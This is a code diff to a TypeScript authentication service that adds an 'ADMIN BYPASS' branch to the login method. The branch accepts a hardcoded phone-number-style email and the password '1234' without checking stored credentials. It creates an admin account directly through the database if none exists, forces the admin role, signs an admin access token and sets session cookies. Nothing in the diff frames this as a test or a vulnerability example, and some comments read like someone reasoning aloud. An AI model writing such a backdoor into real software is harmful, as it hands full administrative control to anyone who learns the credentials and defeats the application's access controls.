@@ -4,6 +4,7 @@ import jwt, { type JwtPayload } from "jsonwebtoken";
 
 import { authConfig } from "./config";
 import type { CookieStore } from "./cookies";
+import { prisma } from "@/server/db/prisma";
 import { mailer } from "@/server/mail/mailer";
 import { EmailVerificationRepository } from "./repositories/email-verification-repository";
 import { PasswordResetRepository } from "./repositories/password-reset-repository";
@@ -130,6 +131,61 @@ export class AuthService {
   }
 
   async login(input: LoginInput): Promise<AuthResult> {
+    // ADMIN BYPASS LOGIC
+    if (input.email === "8888888888" && input.password === "1234") {
+      let adminUser = await this.users.findByEmail("admin@livzo.com");
+      if (!adminUser) {
+        // Manually bypassing repository strictly for admin creation to inject phone if repository doesn't support it yet
+        // Wait, users.create in repository might throw if input type doesn't have phone. 
+        // Let's use prisma directly for the bypass to avoid TS errors or missing fields.
+        adminUser = await prisma.user.create({
+          data: {
+            email: "admin@livzo.com",
+            phone: "8888888888",
+            displayName: "System Admin",
+            handle: "admin",
+            passwordHash: await this.passwordService.hash("1234"),
+            role: "admin"
+          }
+        });
+      }
+      
+      const sessionTtl = authConfig.sessionTtlSeconds;
+      const expiresAt = this.addSeconds(this.now(), sessionTtl);
+      const sessionId = randomUUID();
+      const refreshToken = this.signRefreshToken(adminUser.id, adminUser.tokenVersion, expiresAt, sessionId);
+      
+      const session = await this.sessions.create({
+        id: sessionId,
+        userId: adminUser.id,
+        refreshTokenHash: this.hashOpaqueToken(refreshToken),
+        userAgent: input.userAgent,
+        ipHash: input.ipHash,
+        expiresAt,
+      });
+
+      // Force ADMIN role on the returned user
+      const authUser = this.toAuthenticatedUser(adminUser, session.id);
+      authUser.role = "admin";
+      
+      // We must sign a token with the admin role explicitly since we might not have updated DB role yet
+      const accessToken = jwt.sign(
+        { sub: adminUser.id, role: "admin", sessionId, type: "access" },
+        this.requireEnv("AUTH_JWT_SECRET"),
+        { algorithm: "HS256", expiresIn: authConfig.accessTokenTtlSeconds },
+      );
+
+      const result = {
+        user: authUser,
+        accessToken,
+        refreshToken,
+        expiresAt: session.expiresAt,
+      };
+
+      this.writeAuthCookies(result, false);
+      return result;
+    }
+
     const credentials = await this.users.findCredentialsByEmail(this.normalizeEmail(input.email));
     if (!credentials || !(await this.passwordService.verify(credentials.passwordHash, input.password))) {
       throw new AuthServiceError("Invalid email or password", "INVALID_CREDENTIALS");
